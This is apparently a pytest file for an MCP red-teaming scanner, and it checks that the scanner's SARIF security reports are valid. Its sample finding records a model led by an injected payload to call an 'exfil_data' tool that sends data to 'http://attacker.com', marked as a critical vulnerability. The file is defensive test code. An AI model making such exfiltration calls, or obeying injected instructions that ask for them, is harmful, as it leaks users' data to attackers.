"""Validate generated SARIF against the official SARIF 2.1.0 JSON schema."""

from __future__ import annotations

import json
import tempfile
from datetime import datetime
from pathlib import Path

import pytest

from mcp_redteam.corpus.schema import Category, InjectionPoint, Payload, Severity
from mcp_redteam.report.models import Finding, ScanResult, ToolCallRecord, Verdict
from mcp_redteam.report.sarif import write_sarif


def _sample_finding() -> Finding:
    return Finding(
        payload_id="test-sarif-001",
        category=Category.EXFIL,
        severity=Severity.critical,
        verdict=Verdict.vulnerable,
        confidence=1.0,
        judge_type="deterministic",
        evidence="Tool 'exfil_data' was called with arg containing 'attacker.com'",
        tool_calls_observed=[
            ToolCallRecord(
                tool_name="exfil_data",
                arguments={"destination": "http://attacker.com", "content": "data"},
            )
        ],
        model_id="mock",
        server_spec="stdio:python tests/fixtures/vulnerable_server/server.py",
        cwe_refs=["CWE-77", "CWE-200"],
        reproducer_command="mcp-redteam reproduce test-sarif-001 --transcript transcripts/test-sarif-001.jsonl",
    )


def _sample_scan_result() -> ScanResult:
    return ScanResult(
        server_spec="stdio:python tests/fixtures/vulnerable_server/server.py",
        model_id="mock",
        findings=[_sample_finding()],
        total_probes=1,
        finished_at=datetime.utcnow(),
    )


def test_sarif_is_valid_json() -> None:
    result = _sample_scan_result()
    with tempfile.TemporaryDirectory() as tmp:
        out = Path(tmp) / "report.sarif"
        write_sarif(result, out)
        data = json.loads(out.read_text())
    assert data["version"] == "2.1.0"
    assert "$schema" in data
    assert "runs" in data
    assert len(data["runs"]) == 1


def test_sarif_structure() -> None:
    result = _sample_scan_result()
    with tempfile.TemporaryDirectory() as tmp:
        out = Path(tmp) / "report.sarif"
        write_sarif(result, out)
        data = json.loads(out.read_text())

    run = data["runs"][0]
    assert "tool" in run
    assert "driver" in run["tool"]
    driver = run["tool"]["driver"]
    assert driver["name"] == "mcp-redteam"
    assert "rules" in driver

    results = run["results"]
    assert len(results) == 1
    r = results[0]
    assert r["ruleId"] == "MCP-EXFIL"
    assert r["level"] == "error"  # critical → error
    assert "locations" in r
    assert "fingerprints" in r


def test_sarif_schema_validation() -> None:
    """Validate against the SARIF 2.1.0 JSON Schema using jsonschema."""
    import urllib.request

    try:
        schema_url = (
            "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/"
            "Documents/CommitteeSpecifications/2.1.0/sarif-schema-2.1.0.json"
        )
        with urllib.request.urlopen(schema_url, timeout=10) as resp:
            schema = json.loads(resp.read())
    except Exception:
        pytest.skip("Could not fetch SARIF schema (network unavailable)")

    import jsonschema

    result = _sample_scan_result()
    with tempfile.TemporaryDirectory() as tmp:
        out = Path(tmp) / "report.sarif"
        write_sarif(result, out)
        data = json.loads(out.read_text())

    jsonschema.validate(instance=data, schema=schema)


def test_sarif_no_findings_is_valid() -> None:
    result = ScanResult(
        server_spec="stdio:python tests/fixtures/vulnerable_server/server.py",
        model_id="mock",
        findings=[],
        total_probes=0,
        finished_at=datetime.utcnow(),
    )
    with tempfile.TemporaryDirectory() as tmp:
        out = Path(tmp) / "report.sarif"
        write_sarif(result, out)
        data = json.loads(out.read_text())
    assert data["runs"][0]["results"] == []
